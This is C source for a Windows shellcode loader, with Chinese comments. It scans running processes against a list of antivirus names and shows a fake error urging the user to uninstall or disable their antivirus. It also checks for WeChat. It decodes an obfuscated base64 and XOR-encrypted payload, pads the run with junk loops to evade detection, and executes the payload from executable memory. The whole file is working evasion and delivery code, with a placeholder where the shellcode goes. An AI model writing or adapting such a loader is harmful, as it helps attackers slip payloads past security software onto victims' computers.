#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// 常用杀毒软件的进程名
const char* antivirus_processes[] = {
    "avp.exe", "avg.exe", "mcshield.exe", "msmpeng.exe", "kav.exe", "kaspersky.exe", "nod32.exe", "norton.exe", "symantec.exe", "eset.exe", "avast.exe", "malwarebytes.exe", "comodo.exe", "f-secure.exe", "trendmicro.exe", "avira.exe", "bitdefender.exe", "sophos.exe", "drweb.exe", "antivirus.exe"
};

// 检查是否安装了常用杀毒软件
int is_antivirus_installed() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return 0;
    }

    do {
        for (int i = 0; i < sizeof(antivirus_processes) / sizeof(antivirus_processes[0]); i++) {
            if (strcmp(pe32.szExeFile, antivirus_processes[i]) == 0) {
                CloseHandle(hProcessSnap);
                return 1;
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return 0;
}

// 弹出不兼容文本错误菜单
void show_incompatible_message() {
    MessageBox(NULL, "此程序与您的杀毒软件不兼容，请卸载或禁用杀毒软件后重试。", "不兼容错误", MB_OK | MB_ICONERROR);
}

static char base64_table[] = "Ag9jCXabcJKLV2345WmnopuvwxYZklMhi78NOPrstTUByz0defDEFGHI16+/QRSq";
static unsigned char shellcode[] = "your shellcode";
static char key[] = "AeB&79!ra0(3*)";

// 混淆后的解码函数
void obfuscated_base64_decode(unsigned char *input, unsigned char **output, int len) {
    if (len % 4 != 0) return;

    int output_len = len / 4 * 3;
    if (input[len - 1] == '=') output_len--;
    if (input[len - 2] == '=') output_len--;

    *output = (unsigned char *)malloc(output_len);
    if (*output == NULL) return;

    for (int i = 0, j = 0; i < len;) {
        int a = input[i] == '=' ? 0 : strchr(base64_table, input[i]) - base64_table;
        int b = input[i + 1] == '=' ? 0 : strchr(base64_table, input[i + 1]) - base64_table;
        int c = input[i + 2] == '=' ? 0 : strchr(base64_table, input[i + 2]) - base64_table;
        int d = input[i + 3] == '=' ? 0 : strchr(base64_table, input[i + 3]) - base64_table;

        (*output)[j++] = (a << 2) | (b >> 4);
        if (input[i + 2] != '=') (*output)[j++] = (b << 4) | (c >> 2);
        if (input[i + 3] != '=') (*output)[j++] = (c << 6) | d;

        i += 4;
    }
}

// 这个函数是用来生成随机数的，用于动态混淆
int generate_random_number() {
    return rand() % 100;
}

void xor_encrypt_decrypt(unsigned char *input, unsigned char *output, char *key, int len) {
    int key_length = strlen(key);
    for (int i = 0; i < len; i++) {
        output[i] = input[i] ^ key[i % key_length];
    }
    output[len] = '\0';
}

int is_wechat_installed() {
    if (GetFileAttributes("C:\\Program Files (x86)\\Tencent\\WeChat") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributes("C:\\Program Files\\Tencent\\WeChat") != INVALID_FILE_ATTRIBUTES) {
        return 1;
    }
    return 0;
}

// 冗余函数，增加复杂性
void redundant_function() {
    for (int i = 0; i < 10; i++) {
        generate_random_number();
    }
}

void excess_code() {
    if (is_wechat_installed() == 0) {
        printf("未通过微信检测");
    }
}

int main() {
    if (is_antivirus_installed()) {
        show_incompatible_message();
        return 0;
    }

    excess_code();
    unsigned char *decoded = NULL;
    void *exec_mem = NULL;
    unsigned char decrypted[2048];
    int shellcode_len = sizeof(shellcode) / sizeof(shellcode[0]) - 1;
    long long a = 0;
    long long b  = 1;
    long long c = 0;

    // 混淆代码段
    redundant_function();  // 增加冗余代码

    obfuscated_base64_decode(shellcode, &decoded, shellcode_len);
    for(int i = shellcode_len/4*3-1; i >= 0; i--){
        for(int j = 0; j <= generate_random_number(); j++){ // 动态混淆
            for(int k = 0; k <= generate_random_number(); k++){
                c = a + b;
                a = b;
                b = c;
            }
        }
        if (decoded[i] != '\x00') {
            exec_mem = VirtualAlloc(0, sizeof(decrypted), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            xor_encrypt_decrypt(decoded, decrypted, key, i + 1);
            memcpy(exec_mem, decrypted, sizeof(decrypted));
            break;
        }
    }
    HANDLE hThread = CreateRemoteThread(GetCurrentProcess(), NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}

